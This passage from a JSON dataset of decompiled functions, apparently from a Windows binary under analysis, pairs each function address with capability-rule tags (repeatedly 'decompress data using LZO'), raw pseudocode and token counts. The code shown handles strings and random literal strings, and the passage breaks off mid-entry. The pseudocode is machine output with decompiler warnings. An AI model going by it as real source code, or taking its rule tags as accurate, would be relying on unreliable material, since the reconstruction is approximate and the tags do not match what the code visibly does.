|| (iVar2 = *(iStack108 + -4),  (iStack108 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004257fe;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00425908:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00425914:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00425920:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042592c:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1160
    },
    "00404b6f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00404b6f(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_0000001c;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44c2a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 4;\n    pcStack112 = \"xajqdxuwiinknjeradlngaqkemioaftycokwgnsn\";\n    auStack120[0] = 0x28;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x28, iStack84, \"xajqdxuwiinknjeradlngaqkemioaftycokwgnsn\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x28, uStack36, \"xajqdxuwiinknjeradlngaqkemioaftycokwgnsn\");\n    if (uStack64 < 0x10) {\ncode_r0x004268ba:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x0042698a;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack88) {\n            iVar1 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar1 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar1))\n            goto code_r0x00426996;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar1 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar1 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar1))\n            goto code_r0x004269a2;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542050;\n    }\n    iVar1 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar1 = *(iStack84 + -4),  (iStack84 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x004268ba;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042698a:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00426996:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004269a2:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 988
    },
    "00404c37": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.00404c37(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t in_stack_00000044;\n    uint32_t in_stack_00000058;\n    int32_t in_stack_0000005c;\n    uint32_t in_stack_00000070;\n    uchar auStack36 [4];\n    uchar *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack36;\n    uStack24 = 0x44c030;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    *param_1 = 0;\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    *param_1 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x12);\n    if (in_stack_0000001c < 0x10) {\ncode_r0x0041f9a9:\n        if (0xf < in_stack_00000034) {\n            iVar2 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar2 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar2)) goto code_r0x0041faab;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000058) {\n            iVar2 = in_stack_00000044;\n            if ((0xfff < in_stack_00000058 + 1) &&\n               (iVar2 = *(in_stack_00000044 + -4),  0x1f < (in_stack_00000044 + -4) - iVar2)) goto code_r0x0041fab7;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000070) {\n            iVar2 = in_stack_0000005c;\n            if ((0xfff < in_stack_00000070 + 1) &&\n               (iVar2 = *(in_stack_0000005c + -4),  0x1f < (in_stack_0000005c + -4) - iVar2)) goto code_r0x0041fac3;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = param_2;\n    if ((in_stack_0000001c + 1 < 0x1000) || (iVar2 = *(param_2 + -4),  (param_2 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0041f9a9;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0041faab:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0041fab7:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0041fac3:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 893
    },
    "00404c55": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404c55(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack168 [2];\n    char *pcStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44cb00;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack136 = 0xf;\n    uStack140 = 0xf;\n    uStack156 = 0x736e6676;\n    uStack152 = 0x676c7279;\n    uStack148 = 0x75647877;\n    uStack144 = 0x6c746f;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 4;\n    pcStack160 = \"lpzphpmgmnozmcrylgzfnphygwfgm\";\n    auStack168[0] = 0x1d;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x32, iStack60, \"kcwbktjntnsyafurjwwbdeplffhelbfheojajqzekelglaeaim\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x32, iStack108, \"kcwbktjntnsyafurjwwbdeplffhelbfheojajqzekelglaeaim\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x32, uStack36, \"kcwbktjntnsyafurjwwbdeplffhelbfheojajqzekelglaeaim\");\n    if (uStack88 < 0x10) {\ncode_r0x00440631:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x004406fb;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x00440707;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00440713;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iVar2 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar2 = *(iStack108 + -4),  (iStack108 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00440631;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004406fb:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00440707:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00440713:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1157
    },
    "00404c5f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00404c5f(void)\n\n{\n    uchar **ppuVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c6e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar1 = &ppuStack32;\n    if (0xf < in_stack_00000028) {\n        iVar3 = in_stack_00000014;\n        if ((0xfff < in_stack_00000028 + 1) &&\n           (iVar3 = *(in_stack_00000014 + -4),  0x1f < (in_stack_00000014 + -4) - iVar3)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0043475e;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iVar3);\n        ppuVar1 = ppuStack32;\n    }\n    ppuStack32 = ppuVar1;\n    if (0xf < in_stack_00000050) {\n        iVar3 = in_stack_0000003c;\n        if ((0xfff < in_stack_00000050 + 1) &&\n           (iVar3 = *(in_stack_0000003c + -4),  0x1f < (in_stack_0000003c + -4) - iVar3)) {\ncode_r0x0043475e:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            uVar2 = fcn.004052d1();\n            return uVar2;\n        }\n        fcn.00401a32(iVar3);\n    }\n    *in_FS_OFFSET = piStack28;\n    return 0xe8b0;\n}\n",
        "token_count": 519
    },
    "00404cbe": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404cbe(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x44c060;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 5;\n    pcStack136 = \"wirtlybqorhbiafzbjdbdlms\";\n    auStack144[0] = 0x18;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x35, iStack60, \"kcqfsukjjdejtdgudrbzeatbfylktjfazxsurewmpaxbprucvimac\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x35, iStack108, \"kcqfsukjjdejtdgudrbzeatbfylktjfazxsurewmpaxbprucvimac\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x35, uStack36, \"kcqfsukjjdejtdgudrbzeatbfylktjfazxsurewmpaxbprucvimac\");\n    if (uStack88 < 0x10) {\ncode_r0x0041ff1e:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042002b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x00420037;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00420043;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar2 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2))\n            goto code_r0x0042004f;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar2 = *(iStack108 + -4),  (iStack108 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0041ff1e;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042002b:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00420037:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00420043:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042004f:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1203
    },
    "00404cc3": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00404cc3(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_0000001c;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44bfb0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x42);\n    if (0xf < uStack40) {\n        iVar1 = aiStack60[0];\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(aiStack60[0] + -4),  0x1f < (aiStack60[0] + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0041e780;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < in_stack_0000001c) {\n        iVar1 = param_2;\n        if ((0xfff < in_stack_0000001c + 1) && (iVar1 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar1)) {\ncode_r0x0041e780:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fVar2 = fcn.00403a76();\n            return fVar2;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return *0x541f14;\n}\n",
        "token_count": 494
    },
    "00404d95": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00404d95(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000030;\n    uint32_t in_stack_00000044;\n    uint32_t in_stack_ffffff08;\n    uint32_t in_stack_ffffff20;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44cdf0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 0xb;\n    pcStack160 = \"arbctxovhwxuzbymbleczsfys\";\n    auStack168[0] = 0x19;\n    fcn.00402f72();\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x23, iStack108, \"xizjskcmtkhszqmvtfxnzledlxwtykaouqc\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x19, iStack60, \"lkswfjdjdhwzgyktmmivgsqpw\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xe;\n    fcn.00402f72(0x23, uStack84, \"xizjskcmtkhszqmvtfxnzledlxwtykaouqc\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0x11;\n    fcn.00402f72(0x23, uStack36, \"xizjskcmtkhszqmvtfxnzledlxwtykaouqc\");\n    if (uStack64 < 0x10) {\ncode_r0x0044a2ee:\n        if (0xf < uStack40) {\n            in_stack_ffffff20 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff20) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0044a679;\n                in_stack_ffffff20 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xe;\n        fcn.00402f72(0x23, in_stack_ffffff20 & 0xffffff00 | uStack84 & 0xff, \"xizjskcmtkhszqmvtfxnzledlxwtykaouqc\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0x10;\n        fcn.00402f72(0x23, uStack36, \"xizjskcmtkhszqmvtfxnzledlxwtykaouqc\");\n        if (0xf < uStack64) {\n            in_stack_ffffff08 = uStack64 + 1;\n            uVar1 = uStack84;\n            if (0xfff < in_stack_ffffff08) {\n                uVar1 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar1) goto code_r0x0044a685;\n                in_stack_ffffff08 = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff08 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff08) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0044a691;\n                in_stack_ffffff08 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xe;\n        fcn.00402f72(0x23, in_stack_ffffff08 & 0xffffff00 | uStack84 & 0xff, \"xizjskcmtkhszqmvtfxnzledlxwtykaouqc\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xf;\n        fcn.00402f72(0x23, uStack36, \"xizjskcmtkhszqmvtfxnzledlxwtykaouqc\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x0044a69d;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0044a6a9;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0044a6b5;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x0044a6c1;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x0044a6cd;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x0044a6d9;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000044) {\n            iVar2 = in_stack_00000030;\n            if ((0xfff < in_stack_00000044 + 1) &&\n               (iVar2 = *(in_stack_00000030 + -4),  0x1f < (in_stack_00000030 + -4) - iVar2)) goto code_r0x0044a6e5;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542ae4;\n    }\n    in_stack_ffffff20 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff20 < 0x1000) {\ncode_r0x0044a2e2:\n        fcn.00401a32(uVar1);\n        goto code_r0x0044a2ee;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff20 = uStack64 + 0x24;\n        goto code_r0x0044a2e2;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0044a679:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0044a685:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0044a691:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0044a69d:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0044a6a9:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0044a6b5:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0044a6c1:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x0044a6cd:\n    uStack20 = 8;\n    fcn.004047f5();\ncode_r0x0044a6d9:\n    uStack20 = 9;\n    fcn.004047f5();\ncode_r0x0044a6e5:\n    uStack20 = 10;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 2607
    },
    "00404eb2": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00404eb2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    int32_t aiStack84 [4];\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack84;\n    uStack24 = 0x44c970;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    aiStack84[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x32);\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x53, uStack36, \"jnmzjmvqhmplphrvyhmqxaulllhahnshwzgesxolymxvobpfibgjeolgqgpwqwbfjfrbzdxvtzhnqccfwxj\");\n    if (uStack40 < 0x10) {\ncode_r0x0043bbfa:\n        if (0xf < uStack64) {\n            iVar1 = aiStack84[0];\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(aiStack84[0] + -4),  0x1f < (aiStack84[0] + -4) - iVar1))\n            goto code_r0x0043bcd5;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x0043bce1;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar1 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar1 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar1)) goto code_r0x0043bced;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x5426c4;\n    }\n    iVar1 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(iStack60 + -4),  (iStack60 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043bbfa;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043bcd5:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043bce1:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043bced:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 922
    },
    "00404ebc": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00404ebc(uint *param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000018;\n    uint32_t in_stack_0000002c;\n    uint32_t in_stack_ffffff64;\n    uint auStack124 [2];\n    char *pcStack116;\n    int32_t iStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    uint *puStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack124;\n    uStack24 = 0x44ccf0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack88 = param_1;\n    uStack96 = 0;\n    uStack92 = 0xf;\n    iStack112 = 0;\n    uStack20 = 6;\n    pcStack116 = 